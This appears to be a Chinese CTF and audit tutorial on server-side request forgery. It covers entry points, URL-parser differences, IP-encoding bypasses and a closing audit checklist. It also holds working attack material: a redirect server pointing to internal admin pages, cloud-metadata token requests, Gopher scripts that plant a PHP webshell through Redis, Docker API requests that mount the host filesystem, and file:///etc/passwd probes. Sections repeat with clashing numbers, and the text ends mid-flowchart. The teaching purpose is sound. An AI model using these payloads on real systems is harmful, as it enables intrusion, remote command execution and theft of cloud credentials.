---
title: SSRF
date: 2026-07-15
categories: [web安全, 常见漏洞]
type: tech
---

# SSRF 服务端请求伪造


---

## 一、场景 — 你什么时候会遇到 SSRF

### 0.1 SSRF 的本质

SSRF（Server-Side Request Forgery，服务端请求伪造）是指：攻击者控制了服务端请求的目标或请求的一部分，使服务器代替攻击者访问本机、内网或其他受限制资源。

**一句话理解：** 攻击者不能直接访问目标，但可以让存在漏洞的 Web 服务器替自己访问。

**正常功能 vs SSRF：**

```
正常功能：
用户提交图片 URL → Web 服务器下载图片 → 处理结果返回

SSRF：
攻击者提交 http://127.0.0.1:8080/admin
→ Web 服务器访问自身 8080 端口
→ 原本只对本机开放的管理页面被间接访问
```

**SSRF 成立的条件（三个同时）：**
1. 用户输入最终进入服务端网络请求函数
2. 用户能控制目标主机、端口、协议、路径或请求体中的至少一部分
3. 服务端在真正连接前，没有对最终目标做可靠限制

### 0.2 SSRF、CSRF 与开放重定向

| 漏洞 | 谁发出最终请求 | 主要利用对象 |
|:----|:-------------|:------------|
| SSRF | **服务器** | 本机、内网、云服务、外部服务 |
| CSRF | **受害者浏览器** | 用户已登录的站点 |
| 开放重定向 | 浏览器或服务端请求库 | 跳转到攻击者指定位置 |

开放重定向本身不是 SSRF，但经常用于绕过 SSRF 的"只检查第一次 URL"逻辑。

### 0.3 SSRF 能造成什么

| 能力 | 可能结果 |
|:----|:---------|
| 访问回环地址 | 读取本机管理接口 |
| 访问内网地址 | 内网资产与端口探测 |
| 访问链路本地地址 | 获取云元数据或容器元数据 |
| 使用 `file://` | 读取本地文件 |
| 使用 `gopher://` | 构造自定义 TCP 字节流 |
| 控制 HTTP 方法/请求头/请求体 | 调用内部 API、云元数据 |
| 利用服务端信任 | 绕过来源 IP、网络 ACL |
| 结合未授权服务 | Redis、Docker API、Elasticsearch |
| 盲 SSRF（无回显） | 探测端口、触发内部 API、外带信息 |

### 0.4 做题时先回答的 10 个问题

拿到疑似 SSRF 的参数后，先确认：

1. 请求是否真的由服务端发出？
2. 响应内容是否会回显？
3. 能否控制协议和端口？
4. 能否控制路径与查询参数？
5. 能否控制请求方法、请求头和请求体？
6. 是否自动跟随重定向？
7. URL 会被解码几次？
8. 域名在什么时候解析？
9. 请求库实际支持哪些协议？
10. 请求是否经过代理或后台队列？

这些问题决定后续应该使用 HTTP、`file://`、Gopher、重定向、DNS Rebinding，还是盲 SSRF。

SSRF（Server-Side Request Forgery）发生在**服务器替用户发起网络请求**的功能中。你提交一个 URL，服务器去访问它，然后把结果返回给你——这个链路就是 SSRF 的温床。

 **新手避坑**：不是所有能控制 URL 的功能都是 SSRF。关键区分是请求是否真的由**服务端**发出，而不是由浏览器发出。如果在禁用 JavaScript 后仍然触发请求，才可能是服务端请求。

 **新手避坑**：SSRF 的常见误区是认为一定有回显。实际上很多 SSRF 是盲的——没有响应内容，但可以通过时间侧信道、DNS 外带等方式确认存在。

### 1.1 常见入口速查

| 业务功能 | 风险参数 | 攻击面 |
|---------|---------|--------|
| 远程头像/图片下载 | `url` `image` `avatar` `src` `load` | 读取本机文件、探测内网 |
| 网页截图/PDF生成 | `target` `page` `site` `html` | 访问内网管理页面 |
| Webhook/回调通知 | `callback` `webhook` `notify_url` `hook` | 对外发送数据、回连验证 |
| 文件/数据导入 | `file_url` `download` `resource` `import` | file://读取本地文件 |
| 在线代理/转发 | `proxy` `forward` `dest` `url` | 代理链跳转内网 |
| 链接预览/爬虫 | `link` `preview_url` `fetch` `href` | 自动抓取内网服务 |
| RSS/XML/Feed抓取 | `feed` `xml_url` `rss` | XXE与SSRF组合利用 |
| SSO/OAuth认证 | `redirect_uri` `issuer` `jwks_uri` | 回调地址白名单绕过 |
| API调试器/网关 | `endpoint` `api_url` `target` `host` | 拼接后端服务地址 |
| Host头构造绝对路径 | `Host` `X-Forwarded-Host` | 服务端拼接URL后发起请求 |

### 1.2 真实案例场景

```
场景A：社交平台允许用户设置头像URL → 服务器下载后裁剪 → 提交 file:///etc/passwd
场景B：网页截图服务传入目标URL → 无头浏览器渲染 → 截取内网管理后台
场景C：OA系统回调通知解析 callback 参数 → 服务器POST到内网API
场景D：云函数日志服务传入日志下载链接 → 服务器读取后展示
```

---

## 二、原理 — SSRF 是如何发生的

### 2.1 URL 结构基础

理解 URL 结构是绕过 SSRF 防护的基础。

```
scheme://userinfo@host:port/path?query#fragment
```

| 部分 | 示例 | 说明 |
|:----|:-----|:-----|
| scheme | `http` `https` `file` `gopher` `dict` | 协议 |
| userinfo | `user:pass` | 认证信息，可被 @ 绕过利用 |
| host | `example.com` `127.0.0.1` | 域名或 IP |
| port | `8080` | 端口，省略时用协议默认端口 |
| path | `/admin/flag` | 路径 |
| query | `id=1` | 查询参数 |
| fragment | `top` | 片段，不发送到服务器 |

### 2.2 为什么会出现解析差异

URL 可能经过多层组件：

```
WAF / 业务代码校验
    ↓
框架 URL 解析器 (parse_url)
    ↓
HTTP 客户端 / cURL
    ↓
代理服务器
    ↓
目标 Web 服务器
```

只要两个组件对同一字符串的理解不同，就可能绕过：

```
校验器认为：访问 public.example
请求库认为：访问 127.0.0.1
```

### 2.3 关键字符的解析差异

| 字符 | 校验器理解 | 请求库理解 | 绕过意义 |
|:----|:----------|:-----------|:---------|
| `@` | userinfo 部分 | 真正的 host 在后面 | 改变解析器认定的 host |
| `#` | 忽略 fragment | 截断 URL | 绕过路径校验 |
| `\` | 非法字符 | 路径分隔符（Windows） | 绕过路径检测 |
| `%2f` `/` | 普通字符 | 路径分隔符 | 绕过路径匹配 |
| `%40` `@` | 编码后的 `@` | 解码头后的 `@` | 绕过关键字检测 |
| `%252f` | 双重编码 | 一层解码后为 `%2f` | 多层解码时变形 |

### 2.4 数据流全景

```
用户输入URL
    ↓
URL拼接/解析/校验
    ↓
DNS解析域名
    ↓
（可选）重定向跟随
    ↓
服务端请求库发起连接
    ↓
结果回显/错误/无响应
```

SSRF 成立的条件是**三个同时**：
1. 用户输入最终进入服务端网络请求函数
2. 用户能控制目标主机、端口、协议、路径或请求体中的至少一部分
3. 服务端在真正连接前，没有对最终目标做可靠限制

### 2.2 URL 解析差异是绕不过的核心

```
WAF / 业务代码校验
    ↓
框架URL解析器
    ↓
HTTP客户端 / cURL
    ↓
代理服务器
    ↓
目标服务器
```

两层解析器对同一URL理解不同，就能绕过：

| 差异点 | 校验器认为 | 请求库认为 |
|-------|-----------|-----------|
| `@` 符号 | userinfo部分 | 真正的host在后面 |
| `#` 片段 | 忽略 | 截断URL |
| 编码 `%2f` | 普通字符 | 路径分隔符 |
| 反斜杠 `\` | 非法字符 | 路径分隔符(Windows) |

### 2.3 关键字符速查

| 字符 | 作用 | 绕过意义 |
|------|------|---------|
| `@` | 分隔userinfo与host | 改变解析器认定的host |
| `#` | fragment起点 | 截断校验逻辑 |
| `?` | query起点 | 拆分路径 |
| `\` | 反斜杠路径 | IIS/Tomcat等视为路径 |
| `%2f` `/` | 编码斜杠 | 绕过路径匹配 |
| `%40` `@` | 编码at | 绕过关键字检测 |
| `%252f` | 双重编码 | 多层解码时变形 |
| `.` 尾随点 | 绝对域名标记 | DNS等价但字符串不同 |

 **新手避坑**：`parse_url()` 和 `curl_init()` 对同一 URL 的解析结果可能不同。`parse_url` 认为的 host 和 curl 实际连接的 host 可能不同，这是 URL 解析差异的根本原因。

 **新手避坑**：`file_get_contents()` 支持 URL wrapper 需要 `allow_url_fopen = On`。许多现代 PHP 配置默认禁用了远程文件打开，但 `curl_init()` 通常仍可用。测试时两种方法都试。

### 2.5 常见请求函数与审计入口

#### PHP

| 函数/配置 | SSRF 关注点 |
|:----------|:-----------|
| `file_get_contents()` | 开启 URL wrapper 时可请求远程资源 |
| `fopen()` / `readfile()` | 受 `allow_url_fopen` 和 wrapper 影响 |
| `curl_init()` | 支持协议取决于 libcurl 编译选项 |
| `getimagesize()` | 可能读取远程图片 |
| `SoapClient` | WSDL 和服务地址可能触发请求 |
| `fsockopen()` | 可直接连接主机与端口 |
| `stream_socket_client()` | 可建立 TCP/TLS 连接 |
| `include()` | 特殊配置下可能读取远程资源 |

```php
// 典型危险代码
$url = $_GET['url'] ?? '';
echo file_get_contents($url);

$ch = curl_init($_POST['target']);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
echo curl_exec($ch);
```

#### Python / Node.js / Java / Go

| 语言 | 危险函数 |
|:----|:---------|
| Python | `requests.get(url)` `urllib.request.urlopen(url)` `httpx.get(url)` |
| Node.js | `fetch(url)` `axios.get(url)` `http.get(url)` |
| Java | `new URL(input).openConnection()` `HttpClient.newHttpClient().send()` |
| Go | `http.Get(url)` `client.Do(req)` |

**审计检查点：**
- 是否自动跟随重定向
- DNS 是否在校验后再次解析
- 是否允许用户控制方法、请求头和请求体
- 是否限制超时、响应大小和内容类型

### 2.6 审计搜索关键词速查

```text
curl_init | curl_exec | file_get_contents | fopen | readfile | getimagesize
SoapClient | fsockopen | stream_socket_client | requests.get | urlopen
httpx | aiohttp | fetch( | axios | http.get | new URL | openConnection
HttpClient | http.Get | client.Do | redirect | Location | callback
webhook | proxy | preview | download | render | screenshot | Host | X-Forwarded-Host
```

### 2.7 协议能力边界一览

| 协议 | 用途 | 限制 |
|:----|:------|:------|
| `http://` | Web服务/内部API | 方法/请求头可能不可控 |
| `https://` | HTTPS服务 | 证书校验/SNI/TLS |
| `file://` | 读取本地文件 | 只能读本机；常被禁用 |
| `gopher://` | 任意TCP字节流 | 需libcurl支持；不支持TLS |
| `dict://` | 文本探测 | 数据按DICT协议加工 |
| `ftp://` | FTP服务 | 认证限制 |
| `php://filter` | 读取PHP源码(仅PHP) | 需PHP stream wrapper |

## 三、实战 — 从探测到利用

### 3.1 先回答的 10 个问题

1. 请求是否真的由服务端发出？
2. 响应内容是否会回显？
3. 能否控制协议和端口？
4. 能否控制路径与查询参数？
5. 能否控制请求方法、请求头和请求体？
6. 是否自动跟随重定向？
7. URL 会被解码几次？
8. 域名在什么时候解析？
9. 请求库实际支持哪些协议？
10. 请求是否经过代理或后台队列？

### 3.2 发现与确认

**有回显探测：**
```
?url=http://example.com/          ← 基线
?url=http://127.0.0.1/            ← 回环
?url=http://127.0.0.1:8080/       ← 指定端口
?url=http://[::1]/                ← IPv6回环
?url=file:///etc/passwd           ← 文件读取
?url=dict://127.0.0.1:6379/info   ← Redis探测
```

**记录要点：**
- HTTP 状态码
- 页面标题和正文
- 响应长度和时间
- 错误信息
- 重定向链

**盲SSRF（无回显）：**
使用可控域名观察DNS/HTTP回连：
```
?url=http://YOUR-ID.burpcollaborator.net/test
?url=http://YOUR-VPS:8080/ssrf-test
```

观察：是否收到DNS查询 → 收到HTTP请求 → 请求头/路径/时间

**区分服务端请求 vs 浏览器请求：**
- 来源IP是服务器地址而非客户端
- User-Agent为 `curl` `Python-requests` `Go-http-client` 等
- 禁用前端JS后仍会回连
- 不打开返回页面也会触发请求
- 请求在后台任务执行时出现

### 3.3 内网端口探测脚本

```python
import time
import requests
from urllib.parse import quote

entry = "http://target/fetch?url="
ports = [80, 443, 5000, 6379, 8080, 9200, 11211, 2375, 3306, 27017]

for port in ports:
    inner = f"http://127.0.0.1:{port}/"
    started = time.perf_counter()
    try:
        resp = requests.get(entry + quote(inner, safe=""), timeout=5)
        elapsed = time.perf_counter() - started
        print(f"Port {port}: {resp.status_code} len={len(resp.content)} {elapsed:.2f}s")
    except requests.RequestException as e:
        elapsed = time.perf_counter() - started
        print(f"Port {port}: ERROR {elapsed:.2f}s {e}")
```

只在授权范围内使用，先用确定开放和关闭的端口建立基线。

### 3.4 常见端口与服务速查

| 端口 | 服务 | 利用价值 |
|:----:|:-----|:---------|
| 21 | FTP | 匿名登录/文件访问 |
| 22 | SSH | 暴力破解/密钥 |
| 80/443 | HTTP/HTTPS | Web 服务 |
| 3306 | MySQL | 数据库 |
| 5432 | PostgreSQL | 数据库 |
| 6379 | Redis | 写 webshell |
| 9200 | Elasticsearch | 数据读取 |
| 11211 | Memcached | 缓存数据 |
| 2375 | Docker API | 容器操控 |
| 27017 | MongoDB | 数据库 |
| 10250 | kubelet | Kubernetes 节点

### 3.2 内网地址绕过速查表（10种写法）

| # | 绕过方式 | 示例 | 适用场景 |
|---|---------|------|---------|
| 1 | IPv4十进制整数 | `http://2130706433/` | 只做字符串匹配的黑名单 |
| 2 | IPv4十六进制 | `http://0x7f000001/` | 同上 |
| 3 | IPv4八进制 | `http://0177.0.0.1/` | 同上 |
| 4 | 简写IPv4 | `http://127.1/` | 同上 |
| 5 | IPv6本地 | `http://[::1]/` | 只过滤IPv4 |
| 6 | IPv4映射IPv6 | `http://[::ffff:127.0.0.1]/` | 同上 |
| 7 | 域名指向内网 | `http://internal.attacker.com/` | 只检查原始字符串不解析DNS |
| 8 | URL编码 | `http://127%2e0%2e0%2e1/` | 有解码层数差异 |
| 9 | 双重编码 | `http://127%252e0%252e0%252e1/` | 多层解码场景 |
| 10 | 尾随点 | `http://localhost./` | 字符串不匹配但DNS等价 |

### 3.3 重定向绕过

校验第一跳，不校验后面的Location：

```http
# 攻击者服务器返回302
HTTP/1.1 302 Found
Location: http://127.0.0.1:8080/admin
```

流程：`公网域名通过校验 → 302跳转 → cURL跟随到127.0.0.1 → 获取内网数据`

攻击者服务器代码：
```python
from flask import Flask, redirect
app = Flask(__name__)

@app.get("/jump")
def jump():
    return redirect("http://127.0.0.1:8080/admin/flag", code=302)

app.run(host="0.0.0.0", port=8000)
```

### 3.4 DNS Rebinding

```
第一次DNS查询 → 返回公网IP → 通过IP校验
第二次DNS查询 → 返回内网IP → 请求库连接内网
```

成立条件：
- 攻击者控制DNS服务器
- 校验与连接发生了两次DNS解析
- TTL足够小，允许答案变化
- 请求库没有固定已校验的IP

### 3.5 云元数据攻击

**核心地址（链路本地）：**
```
http://169.254.169.254/
```

| 云厂商 | 路径/头 | 备注 |
|-------|---------|------|
| AWS | `/latest/meta-data/` | IMDSv2需要PUT获取Token |
| GCP | `/computeMetadata/v1/` | 需要`Metadata-Flavor: Google`头 |
| Azure | `/metadata/instance?api-version=2021-02-01` | 需要`Metadata: true`头 |
| 阿里云 | `/latest/meta-data/` | / |
| 腾讯云 | `/latest/meta-data/` | / |

**AWS IMDSv2流程（需控制请求方法+头）：**
```
PUT http://169.254.169.254/latest/api/token
  头: X-aws-ec2-metadata-token-ttl-seconds: 21600
  → 返回 Token

GET http://169.254.169.254/latest/meta-data/
  头: X-aws-ec2-metadata-token: <Token>
  → 获取元数据
```

 **新手避坑**：Gopher 虽然强大，但不是所有服务端请求库都支持。特别是 Python 的 `requests` 和 Node.js 的 `fetch` 默认不支持 Gopher 协议。PHP 的 `file_get_contents()` 和 `curl_init()` 是否支持取决于 libcurl 编译选项。在尝试 Gopher 前先用 `dict://` 或 `file://` 确认协议支持范围。

 **新手避坑**：Gopher URL 的 `_` 后的内容会被视为原始 TCP 数据发送。但这个数据本身如果包含非 ASCII 字符，可能需要多一层 URL 编码。实际发送时经常遇到"少编码了一层或多编码了一层"的问题。

### 3.6 Gopher 协议 — 任意TCP字节流

Gopher格式：`gopher://host:port/_URL编码后的原始数据`

**构造HTTP请求：**
```python
from urllib.parse import quote_from_bytes

# 构造原始HTTP请求
raw = (
    b"GET /admin HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Connection: close\r\n"
    b"\r\n"
)
url = "gopher://127.0.0.1:8080/_" + quote_from_bytes(raw, safe="")
print(url)
```

**构造HTTP POST：**
```python
import json
from urllib.parse import quote_from_bytes

body = json.dumps(
    {"username": "admin", "password": "123456"},
    separators=(",", ":")
).encode()

request = (
    b"POST /api/login HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Content-Type: application/json\r\n"
    + f"Content-Length: {len(body)}\r\n".encode()
    + b"Connection: close\r\n"
    + b"\r\n"
    + body
)
print("gopher://127.0.0.1:8080/_" + quote_from_bytes(request, safe=""))
```

### 3.7 Gopher + Redis 无认证写WebShell

**RESP协议生成器：**
```python
from urllib.parse import quote_from_bytes

def resp(*parts):
    result = f"*{len(parts)}\r\n".encode()
    for part in parts:
        data = part if isinstance(part, bytes) else str(part).encode()
        result += f"${len(data)}\r\n".encode()
        result += data + b"\r\n"
    return result

# 先PING测试连通性
paylaod = resp("PING")
print("gopher://127.0.0.1:6379/_" + quote_from_bytes(payload, safe=""))
```

**写WebShell完整脚本：**
```python
from urllib.parse import quote_from_bytes

def resp(*parts):
    output = f"*{len(parts)}\r\n".encode()
    for part in parts:
        data = part if isinstance(part, bytes) else str(part).encode()
        output += f"${len(data)}\r\n".encode()
        output += data + b"\r\n"
    return output

php = b"<?php echo shell_exec($_GET['cmd'] ?? 'id'); ?>"

payload = b"".join([
    resp("CONFIG", "SET", "dir", "/var/www/html"),
    resp("CONFIG", "SET", "dbfilename", "shell.php"),
    resp("SET", "x", php),
    resp("SAVE"),
])

print("gopher://127.0.0.1:6379/_" + quote_from_bytes(payload, safe=""))
```

**Gopher 使用限制：**

| 限制 | 说明 |
|:----|:------|
| TLS | Gopher 不能直接处理 TLS 连接 |
| UDP | Gopher 只支持 TCP |
| 多轮握手 | 随机挑战协议（如 MySQL 认证）不能用静态字节流完成 |
| URL 长度 | 过长的 Gopher URL 可能被中间件截断 |
| 解码层数 | 外层参数可能再次编码，需要精确控制 |

**Gopher URL 的双层编码：**

```python
from urllib.parse import quote, quote_from_bytes

# 第一层：对原始 TCP 字节流编码
raw = b"GET / HTTP/1.1\r\nHost: 127.0.0.1\r\n\r\n"
gopher_url = "gopher://127.0.0.1:80/_" + quote_from_bytes(raw, safe="")

# 第二层：Gopher URL 放进外层 SSRF 参数
outer_url = "http://target/fetch?url=" + quote(gopher_url, safe="")
print(outer_url)
```

**失败原因排查：**

| 现象 | 原因 |
|:-----|:------|
| 完全无响应 | Gopher未启用或端口错误 |
| HTTP 400 | 请求行或CRLF错误 |
| POST body截断 | Content-Length错误 |
| URL在`#`截断 | `#`未编码 |
| 目标收到`%0d%0a`字面量 | 多编码一层 |
| 只发送部分内容 | URL长度限制或中间件截断 |
| Redis需要认证 | 未先AUTH |
| CONFIG SET失败 | ACL禁止或保护模式 |
| 文件写入但为空 | Redis与Web不共享文件系统 |
| Redis 3.2.7+ 拒绝连接 | 跨协议攻击检测 |

### 3.7.1 Redis 利用深入

**前提条件检查清单：**
- [ ] Redis 端口可达（6379）
- [ ] 无密码认证（或已知密码）
- [ ] ACL 允许 `CONFIG`/`SAVE` 命令
- [ ] 目标目录可写
- [ ] Redis 与 Web 共享文件系统
- [ ] Redis 低于 3.2.7（跨协议攻击兼容）

**认证场景（requirepass）：**

```python
def resp(*parts):
    output = f"*{len(parts)}\r\n".encode()
    for part in parts:
        data = part if isinstance(part, bytes) else str(part).encode()
        output += f"${len(data)}\r\n".encode()
        output += data + b"\r\n"
    return output

payload = b"".join([
    resp("AUTH", "mypassword"),                    # 先认证
    resp("CONFIG", "SET", "dir", "/var/www/html"),
    resp("CONFIG", "SET", "dbfilename", "shell.php"),
    resp("SET", "x", b"<?php system($_GET['cmd']); ?>"),
    resp("SAVE"),
])
```

### 3.8 Docker Remote API 未授权

**探测命令：**
```
http://127.0.0.1:2375/_ping         → OK（确认API可用）
http://127.0.0.1:2375/version       → API版本
http://127.0.0.1:2375/info          → 守护进程信息
http://127.0.0.1:2375/containers/json    → 容器列表
http://127.0.0.1:2375/images/json        → 镜像列表（确认可用镜像）
```

**创建容器读宿主机文件（Gopher构造）：**

```python
import json
from urllib.parse import quote_from_bytes

# Step 1: 创建容器
body = json.dumps({
    "Image": "alpine:latest",
    "Cmd": ["/bin/sh", "-c", "cat /host/flag"],
    "Tty": True,
    "HostConfig": {"Binds": ["/:/host:ro"]}
}, separators=(",", ":")).encode()

create_req = (
    b"POST /containers/create?name=ctf_reader HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Content-Type: application/json\r\n"
    + f"Content-Length: {len(body)}\r\n".encode()
    + b"Connection: close\r\n\r\n"
    + body
)
print("gopher://127.0.0.1:2375/_" + quote_from_bytes(create_req, safe=""))
```

**启动容器：**
```python
start_req = (
    b"POST /containers/ctf_reader/start HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Content-Length: 0\r\n"
    b"Connection: close\r\n\r\n"
)
print("gopher://127.0.0.1:2375/_" + quote_from_bytes(start_req, safe=""))
```

**读取日志：**
```python
logs_req = (
    b"GET /containers/ctf_reader/logs?stdout=1&stderr=1 HTTP/1.1\r\n"
    b"Host: 127.0.0.1\r\n"
    b"Connection: close\r\n\r\n"
)
print("gopher://127.0.0.1:2375/_" + quote_from_bytes(logs_req, safe=""))
```

**Docker API 利用条件：**

| 条件 | 检查方法 | 备注 |
|:----|:---------|:-----|
| API 暴露 TCP | `/_ping` 返回 OK | 默认只监听 Unix Socket |
| 无认证 | 直接返回容器列表 | 可能通过 TLS 或证书认证 |
| 本地有可用镜像 | `/images/json` 列出 | 优先用已有镜像 |
| 允许 bind mount | 创建容器时能挂载宿主机目录 | rootless 模式可能受限 |

** 新手避坑 4：** Docker API SSRF 中只返回 GET 请求的结果。创建和启动容器需要 POST 请求，通常要用 Gopher 协议构造。如果 SSRF 入口只支持 HTTP GET，Docker API 创建容器这条链无法直接使用。

### 3.9 云元数据攻击深入

**核心地址（链路本地）：**
```
http://169.254.169.254/
```

| 云厂商 | 路径 | 额外要求 |
|:------|:------|:---------|
| AWS | `/latest/meta-data/` | IMDSv2 需 PUT 获取 Token |
| GCP | `/computeMetadata/v1/` | 需 `Metadata-Flavor: Google` 头 |
| Azure | `/metadata/instance?api-version=2021-02-01` | 需 `Metadata: true` 头 |
| 阿里云 | `/latest/meta-data/` | 无 |
| 腾讯云 | `/latest/meta-data/` | 无 |

**AWS IMDSv2 流程（需控制请求方法+头）：**
```
PUT http://169.254.169.254/latest/api/token
  头: X-aws-ec2-metadata-token-ttl-seconds: 21600
  → 返回 Token

GET http://169.254.169.254/latest/meta-data/
  头: X-aws-ec2-metadata-token: <Token>
  → 获取元数据
```

** 新手避坑 5：** `169.254.169.254` 不是只有 AWS 使用。GCP、Azure、阿里云、腾讯云都使用这个地址。不同云厂商的路径和请求头要求不同，需要根据上下文判断云环境类型。

### 3.10 DNS Rebinding 深入

**攻击流程：**
```
第一次DNS查询 → 返回公网IP → 通过IP校验
第二次DNS查询 → 返回内网IP → 请求库连接内网
```

**成立条件：**
- 攻击者控制 DNS 服务器
- 校验与连接发生了两次 DNS 解析
- TTL 足够小，允许答案变化
- 请求库没有固定已校验的 IP

**防御关键：** 校验全部解析地址，将已校验 IP 固定到实际连接；每次重定向重新校验。

**实现方案：**

| 方案 | 原理 | 难度 |
|:----|:-----|:----:|
| 自建 DNS 服务器 | TTL=0，交替返回公网和内网 IP | 高 |
| 使用 rebind 服务 | rebind.it / 1u.ms 等在线服务 | 低 |
| 域名带多个 A 记录 | 一个域名绑多个 IP | 中 |

### 3.11 盲 SSRF 深入

**无回显时的判断方法：**

| 方法 | 说明 |
|:----|:------|
| DNS 外带 | 使用可控域名观察 DNS 查询 |
| HTTP 外带 | 使用 Burp Collaborator 或 VPS 接收 HTTP 请求 |
| 时间侧信道 | 对比开放端口和关闭端口的响应时间 |
| 创建临时资源 | 写固定名称的 key 到 Redis，后续确认是否存在 |

**盲 SSRF 探测脚本：**
```python
import requests
import time

entry = "http://target/fetch?url="
# 使用可控域名观察回连
test_url = "http://your-id.burpcollaborator.net/ssrf-test"
try:
    r = requests.get(entry + test_url, timeout=5)
    print(f"Status: {r.status_code}, Length: {len(r.text)}")
except Exception as e:
    print(f"Error: {e}")
```

**盲 SSRF 可以做的事：**
1. 探测端口开放（通过响应时间差异）
2. 触发内部 API（创建/修改资源）
3. 外带信息（通过 DNS 或 HTTP）
4. 写入临时标记（Redis SET / Memcached set）

### 3.12 Host Header SSRF

```php
// 危险模式
$base = "https://" . $_SERVER['HTTP_HOST'];
$html = file_get_contents($base . "/render");
```

**需要检查的头：**
```
Host
X-Forwarded-Host
X-Original-Host
Forwarded
X-Forwarded-Proto
```

**防御：** 使用配置中的固定站点地址，只信任来自受控反向代理的转发头。

### 3.13 其他内网服务探测

| 服务 | 端口 | 探测方式 |
|------|------|---------|
| Redis | 6379 | `dict://127.0.0.1:6379/info` |
| Memcached | 11211 | `gopher://127.0.0.1:11211/_stats%0d%0a` |
| Elasticsearch | 9200 | `http://127.0.0.1:9200/_cat/indices` |
| MySQL | 3306 | 二进制协议，需专门工具 |
| Kubernetes API | 6443/443 | `http://10.96.0.1/api/v1` |
| kubelet | 10250 | `http://127.0.0.1:10250/pods` |

### 3.14 完整例题：重定向绕过

**题目源码：**
```php
<?php
$url = $_GET['url'] ?? '';
$parts = parse_url($url);
if (!is_array($parts) || !isset($parts['scheme'], $parts['host'])) { die('bad url'); }
if (!in_array(strtolower($parts['scheme']), ['http', 'https'], true)) { die('bad scheme'); }

$ip = gethostbyname($parts['host']);
if (!filter_var($ip, FILTER_VALIDATE_IP, FILTER_FLAG_NO_PRIV_RANGE | FILTER_FLAG_NO_RES_RANGE)) {
    die('private ip');
}

$ch = curl_init($url);
curl_setopt($ch, CURLOPT_RETURNTRANSFER, true);
curl_setopt($ch, CURLOPT_FOLLOWLOCATION, true);
curl_setopt($ch, CURLOPT_TIMEOUT, 5);
echo curl_exec($ch);
?>
```

**漏洞分析：** 代码校验了初始 URL，但开启自动重定向，未校验后续 `Location`。

**攻击者服务器：**
```python
from flask import Flask, redirect
app = Flask(__name__)
@app.get("/jump")
def jump():
    return redirect("http://127.0.0.1:8080/admin/flag", code=302)
app.run(host="0.0.0.0", port=8000)
```

**攻击请求：** `?url=http://attacker.example:8000/jump`

**流程：** 公网域名通过校验 → 302 跳转 → cURL 跟随到 127.0.0.1 → 获取内网数据。

### 3.15 SSRF 源码审计数据流与检查表

```
输入点 → 字符串拼接 → URL 规范化 → scheme/host/port 校验
→ DNS 解析 → IP 校验 → 重定向 → 实际连接 → 响应处理
```

**检查表：**
- [ ] 是否允许用户提交完整 URL？
- [ ] 是否只用正则或字符串黑名单？
- [ ] 是否接受 userinfo？
- [ ] 是否允许非 HTTP 协议？
- [ ] 是否校验端口？
- [ ] 是否解析全部 A 和 AAAA？
- [ ] 是否拒绝回环/私网/链路本地/组播/保留地址？
- [ ] 校验后是否再次解析 DNS？
- [ ] 是否固定已校验 IP？
- [ ] 是否自动跟随重定向？是否校验每一跳？
- [ ] 是否信任 Host 或转发头？
- [ ] 是否限制超时、响应大小和类型？
- [ ] 是否限制出站网络？

### 3.16 协议能力完整速查

| 协议 | 用途 | 限制 |
|:-----|:------|:------|
| `http://` | Web服务/内部API | 方法/请求头可能不可控 |
| `https://` | HTTPS服务 | 证书校验/SNI |
| `file://` | 读取本地文件 | 只能读本机；常被禁用 |
| `gopher://` | 任意TCP字节流 | 需libcurl支持；不支持TLS |
| `dict://` | 文本探测 | 数据按DICT协议加工 |
| `ftp://` | FTP服务 | 认证限制 |
| `php://filter` | 读取PHP源码(仅PHP) | 需要PHP stream wrapper |
| `ldap://` | LDAP 服务 | 请求格式与支持情况依客户端 |
| `smtp://` | 邮件协议 | 依赖客户端编译支持 |
| `sftp://` | 文件服务 | 并非所有客户端都支持 |

---

## 四、避坑 — 新手最容易犯的错误

### 4.1 只拦截 localhost 或 127.0.0.1

**遗漏清单：**
- `127.0.0.0/8` 其他地址（127.1、127.0.0.2 等）
- IPv6 回环 `[::1]`
- DNS 解析到内网的域名
- 重定向跳转到内网
- DNS Rebinding
- 其他私网和链路本地范围

### 4.2 校验后让客户端重新解析

```
校验时解析DNS → 通过 → 实际连接时再次解析
```
这是 DNS Rebinding 的根本原因。正确做法：固定已校验的 IP 到实际连接。

### 4.3 没回显就认为安全

盲 SSRF 仍可：
- 探测端口开放（响应时间差异）
- 触发内部 API（创建/修改资源）
- 外带信息（DNS/HTTP 回连）
- 写入临时标记（Redis SET / Memcached set）

### 4.4 混淆开放重定向与 SSRF

| 漏洞 | 谁发请求 | 利用对象 |
|:----|:---------|:---------|
| SSRF | **服务器** | 本机/内网/云服务 |
| 开放重定向 | **浏览器** | 跳转到攻击者页面 |

### 4.5 Gopher 不是万能协议

Gopher 不天然解决：
- TLS 加密连接
- UDP 协议
- 随机握手机制（如 MySQL 认证）
- 多轮交互协议
- 请求库不支持 Gopher

### 4.6 Host 头 SSRF 陷阱

```php
$base = "https://" . $_SERVER['HTTP_HOST'];
$html = file_get_contents($base . "/render"); // 危险！
```

**需要检查的头：**
```
Host / X-Forwarded-Host / X-Original-Host / Forwarded / X-Forwarded-Proto
```

### 4.7 其他常见误区

| 误区 | 真相 |
|:----|:-----|
| 只检查域名或第一个 DNS 答案 | 必须检查全部 A/AAAA 记录 |
| 空响应等于端口关闭 | 可能是协议不匹配或请求异步 |
| Gopher 能打任何协议 | 不支持 TLS/UDP/随机握手 |
| 127.0.0.1 被拦就没办法 | 还有 IPv6/十进制/八进制/域名解析 |
| file 协议禁用就只能打 HTTP | 还可能用 gopher/dict 等 |
| SSRF 只在 PHP 中发生 | Python/Go/Java/Node 同样存在 |
| 有 WAF 就安全了 | WAF 可能被 URL 编码/解析差异绕过 |
| cURL 一定支持 Gopher | 取决于 libcurl 编译选项 |

### 4.8 SSRF 5 分钟快速检测流程

```
① 提交一个你自己可控的 URL → 有回连？
   ├─ 是 → SSRF 确认 
   ├─ 否 → 进入②

② 提交 http://127.0.0.1:8080/ → 状态码/时间变化？
   ├─ 是 → SSRF 确认 （可能是盲 SSRF）
   └─ 否 → 进入③

③ 提交 file:///etc/passwd → 内容变化？
   ├─ 是 → SSRF + 文件读取
   └─ 否 → 进入④

④ 提交 dict://127.0.0.1:6379/info → 响应变化？
   ├─ 是 → SSRF 确认 
